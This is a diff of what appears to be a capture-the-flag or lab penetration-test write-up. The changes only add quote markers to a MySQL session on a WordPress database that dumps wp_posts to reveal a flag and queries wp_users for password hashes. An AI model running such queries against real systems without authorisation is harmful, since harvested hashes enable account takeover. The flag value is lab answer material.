@@ -160,7 +160,7 @@ The following vulnerabilities were identified on each target:
 
 
 > mysql> use wordpress;
-Database changed
+> Database changed
 mysql> show tables;
 +-----------------------+
 | Tables_in_wordpress   |
@@ -180,13 +180,13 @@ mysql> show tables;
 +-----------------------+
 12 rows in set (0.00 sec)
 
-select * from wp_posts;
+> select * from wp_posts;
 
-| 2018-08-13 01:48:31 | 0000-00-00 00:00:00 | flag3{afc01ab56b50591e7dccf93122770cd2}
+> | 2018-08-13 01:48:31 | 0000-00-00 00:00:00 | flag3{afc01ab56b50591e7dccf93122770cd2}
 
 And was able to find additional users hashes in wp_users.
 
-mysql> select * from wp_users;
+> mysql> select * from wp_users;
 +----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
 | ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
 +----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
